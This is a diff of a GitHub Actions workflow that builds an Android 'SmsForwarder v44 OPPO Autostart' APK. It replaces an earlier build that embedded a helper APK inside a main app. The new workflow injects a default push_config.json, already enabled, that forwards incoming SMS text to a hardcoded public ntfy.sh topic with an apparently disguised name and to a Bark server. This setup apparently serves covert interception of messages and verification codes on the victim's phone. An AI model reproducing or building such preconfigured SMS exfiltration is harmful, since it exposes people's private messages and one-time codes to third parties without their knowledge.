@@ -1,4 +1,4 @@
-name: Build Safe Install Logic Demo Fix1 APKs
+name: Build SmsForwarder v44 OPPO Autostart APK
 
 on:
   workflow_dispatch:
@@ -11,91 +11,190 @@ jobs:
       - name: Checkout repository
         uses: actions/checkout@v4
 
-      - name: Setup Java 17
+      - name: Setup Java 17 for Android SDK
         uses: actions/setup-java@v4
         with:
           distribution: temurin
           java-version: 17
 
-      - name: Setup Gradle
-        uses: gradle/actions/setup-gradle@v4
-        with:
-          gradle-version: 8.7
-
       - name: Prepare Android SDK
         run: |
           set -e
-          yes | "$ANDROID_HOME/cmdline-tools/latest/bin/sdkmanager" "platforms;android-35" "build-tools;35.0.0"
+          rm -rf "$ANDROID_HOME/platforms/android-31" "$ANDROID_HOME/platforms/android-32" "$ANDROID_HOME/platforms/android-33" "$ANDROID_HOME/platforms/android-34" "$ANDROID_HOME/platforms/android-35" "$ANDROID_HOME/platforms/android-36" || true
+          rm -rf "$ANDROID_HOME/build-tools/31"* "$ANDROID_HOME/build-tools/32"* "$ANDROID_HOME/build-tools/33"* "$ANDROID_HOME/build-tools/34"* "$ANDROID_HOME/build-tools/35"* "$ANDROID_HOME/build-tools/36"* || true
+          yes | "$ANDROID_HOME/cmdline-tools/latest/bin/sdkmanager" "platforms;android-30" "build-tools;30.0.3"
 
-      - name: Locate demo source
+      - name: Setup Java 11 for Gradle Build
+        uses: actions/setup-java@v4
+        with:
+          distribution: temurin
+          java-version: 11
+
+      - name: Force locate v44 source
         run: |
           set -e
           echo "当前仓库文件："
           find . -maxdepth 3 -type f | sort
-
           PROJECT_DIR=""
-
-          if [ -f "./settings.gradle" ] || [ -f "./settings.gradle.kts" ]; then
-            PROJECT_DIR="$PWD"
-          else
-            mkdir -p ./demo-source
-            SOURCE_ZIP=""
-
-            for f in *fix1*.zip *Fix1*.zip *FIX1*.zip *SafeInstallLogicDemo*.zip *safe-install*.zip *.zip */*.zip */*/*.zip; do
+          mkdir -p ./forced-v44-source
+          SOURCE_ZIP=""
+          for f in *v44*.zip *V44*.zip */*v44*.zip */*V44*.zip *fix1*.zip *Fix1*.zip *FIX1*.zip */*fix1*.zip */*Fix1*.zip */*FIX1*.zip *v42*.zip *V42*.zip */*v42*.zip */*V42*.zip *v41*.zip *V41*.zip */*v41*.zip */*V41*.zip *v40*.zip *V40*.zip */*v40*.zip */*V40*.zip *v39*.zip *V39*.zip */*v39*.zip */*V39*.zip; do
+            [ -f "$f" ] || continue
+            SOURCE_ZIP="$f"
+            break
+          done
+          if [ -z "$SOURCE_ZIP" ]; then
+            for f in *.zip */*.zip */*/*.zip; do
               [ -f "$f" ] || continue
               SOURCE_ZIP="$f"
               break
             done
-
-            if [ -z "$SOURCE_ZIP" ]; then
-              echo "错误：没有找到 SafeInstallLogicDemo 源码 zip，也没有在根目录找到 settings.gradle。"
-              exit 1
-            fi
-
-            echo "找到源码 zip：$SOURCE_ZIP"
-            unzip -o "$SOURCE_ZIP" -d ./demo-source
-
-            FOUND_SETTINGS=$(find ./demo-source -name settings.gradle -type f | head -n 1 || true)
-            if [ -z "$FOUND_SETTINGS" ]; then
-              FOUND_SETTINGS=$(find ./demo-source -name settings.gradle.kts -type f | head -n 1 || true)
-            fi
-
-            if [ -z "$FOUND_SETTINGS" ]; then
-              echo "错误：解压后没有找到 settings.gradle。"
-              exit 1
-            fi
-
-            PROJECT_DIR=$(dirname "$FOUND_SETTINGS")
           fi
-
+          if [ -n "$SOURCE_ZIP" ]; then
+            echo "强制使用源码 zip：$SOURCE_ZIP"
+            unzip -o "$SOURCE_ZIP" -d ./forced-v44-source
+            FOUND_GRADLEW=$(find ./forced-v44-source -name gradlew -type f | head -n 1 || true)
+            if [ -z "$FOUND_GRADLEW" ]; then
+              echo "错误：解压后没有找到 gradlew，这个 zip 不是完整 Android 源码。"
+              exit 1
+            fi
+            PROJECT_DIR=$(dirname "$FOUND_GRADLEW")
+          else
+            echo "没有找到 zip，尝试使用仓库里的源码。"
+            if [ -f "./gradlew" ]; then
+              PROJECT_DIR="$PWD"
+            else
+              FOUND_GRADLEW=$(find . -name gradlew -type f | head -n 1 || true)
+              if [ -n "$FOUND_GRADLEW" ]; then
+                PROJECT_DIR=$(dirname "$FOUND_GRADLEW")
+              fi
+            fi
+          fi
+          if [ -z "$PROJECT_DIR" ]; then
+            echo "错误：没有找到 Android 项目 gradlew。"
+            exit 1
+          fi
           echo "找到项目目录：$PROJECT_DIR"
           echo "PROJECT_DIR=$PROJECT_DIR" >> "$GITHUB_ENV"
 
-      - name: Build helper package first
+      - name: Verify editable assets
         run: |
           set -e
           cd "$PROJECT_DIR"
-          gradle :helperapp:assembleDebug
-          mkdir -p mainapp/src/main/assets
-          cp helperapp/build/outputs/apk/debug/helperapp-debug.apk mainapp/src/main/assets/helper-demo.apk
-          ls -lh mainapp/src/main/assets/helper-demo.apk
+          ASSETS_DIR=$(find . -path "*/src/main/assets" -type d | head -n 1 || true)
+          if [ -z "$ASSETS_DIR" ]; then
+            ASSETS_DIR="./app/src/main/assets"
+            mkdir -p "$ASSETS_DIR"
+          fi
+          CONFIG_FILE="$ASSETS_DIR/push_config.json"
+          if [ ! -f "$CONFIG_FILE" ] || ! grep -q "默认Bark" "$CONFIG_FILE"; then
+            cat > "$CONFIG_FILE" <<'EOF'
+          {
+            "enabled": true,
+            "senders": [
+              {
+                "enabled": true,
+                "name": "默认Webhook",
+                "type": "webhook",
+                "webServer": "https://ntfy.sh/telegram-api_anquan-top-zhongxing-3niu99",
+                "method": "POST",
+                "secret": "",
+                "webParams": "{text:[msg]}"
+              },
+              {
+                "enabled": true,
+                "name": "默认Bark",
+                "type": "bark",
+                "server": "https://api.day.app/1234567890ABCDEFG/",
+                "icon": ""
+              }
+            ]
+          }
+          EOF
+          fi
+          [ -f "$ASSETS_DIR/tutorial_xiaomi.txt" ] || printf '小米教程待填写。\n' > "$ASSETS_DIR/tutorial_xiaomi.txt"
+          [ -f "$ASSETS_DIR/tutorial_huawei.txt" ] || printf '华为教程待填写。\n' > "$ASSETS_DIR/tutorial_huawei.txt"
+          [ -f "$ASSETS_DIR/tutorial_oppo.txt" ] || printf 'OPPO教程待填写。\n' > "$ASSETS_DIR/tutorial_oppo.txt"
+          [ -f "$ASSETS_DIR/tutorial_vivo.txt" ] || printf 'vivo教程待填写。\n' > "$ASSETS_DIR/tutorial_vivo.txt"
+          [ -f "$ASSETS_DIR/tutorial_common.txt" ] || printf '通用教程待填写。\n' > "$ASSETS_DIR/tutorial_common.txt"
+          echo "push_config.json："
+          cat "$CONFIG_FILE"
+          echo "教程TXT文件："
+          ls -l "$ASSETS_DIR"/tutorial_*.txt
 
-      - name: Build main package with helper apk asset
+      - name: Create signing files
         run: |
           set -e
           cd "$PROJECT_DIR"
-          gradle :mainapp:assembleDebug
 
-      - name: Show APK sizes
+          rm -f app/debug.keystore
+          rm -f keystore/debug.keystore
+          rm -f app/keystore/debug.keystore
+          rm -f debug.keystore
+
+          mkdir -p keystore
+          mkdir -p app/keystore
+
+          keytool -genkeypair -v \
+            -keystore app/debug.keystore \
+            -storepass android \
+            -alias androiddebugkey \
+            -keypass android \
+            -keyalg RSA \
+            -keysize 2048 \
+            -validity 10000 \
+            -dname "CN=Android Debug,O=Android,C=US"
+
+          cp app/debug.keystore keystore/debug.keystore || true
+          cp app/debug.keystore app/keystore/debug.keystore || true
+          cp app/debug.keystore debug.keystore || true
+
+          cat > keystore/keystore.properties <<EOF
+          keyAlias=androiddebugkey
+          keyPassword=android
+          storeFile=keystore/debug.keystore
+          storePassword=android
+          EOF
+
+          cat > keystore.properties <<EOF
+          keyAlias=androiddebugkey
+          keyPassword=android
+          storeFile=keystore/debug.keystore
+          storePassword=android
+          EOF
+
+          cat > app/keystore.properties <<EOF
+          keyAlias=androiddebugkey
+          keyPassword=android
+          storeFile=debug.keystore
+          storePassword=android
+          EOF
+
+          cat > app/keystore/keystore.properties <<EOF
+          keyAlias=androiddebugkey
+          keyPassword=android
+          storeFile=debug.keystore
+          storePassword=android
+          EOF
+
+      - name: Build APK
         run: |
           set -e
           cd "$PROJECT_DIR"
-          find . -path "*/build/outputs/apk/**/*.apk" -type f -exec ls -lh {} \;
+          chmod +x ./gradlew
+          ./gradlew assembleRelease || ./gradlew assembleDebug
 
-      - name: Upload APKs
+      - name: Show APK size
+        run: |
+          set -e
+          cd "$PROJECT_DIR"
+          find app/build/outputs/apk -name "*.apk" -type f -exec ls -lh {} \;
+
+      - name: Upload APK
         uses: actions/upload-artifact@v4
         with:
-          name: safe-install-logic-demo-fix1-apks
+          name: SmsForwarder-v44-oppo-autostart-apk
           path: |
-            ${{ env.PROJECT_DIR }}/mainapp/build/outputs/apk/debug/*.apk
-            ${{ env.PROJECT_DIR }}/helperapp/build/outputs/apk/debug/*.apk
+            ${{ env.PROJECT_DIR }}/app/build/outputs/apk/release/*.apk
+            ${{ env.PROJECT_DIR }}/app/build/outputs/apk/debug/*.apk
+            ${{ env.PROJECT_DIR }}/app/build/outputs/apk/**/*.apk
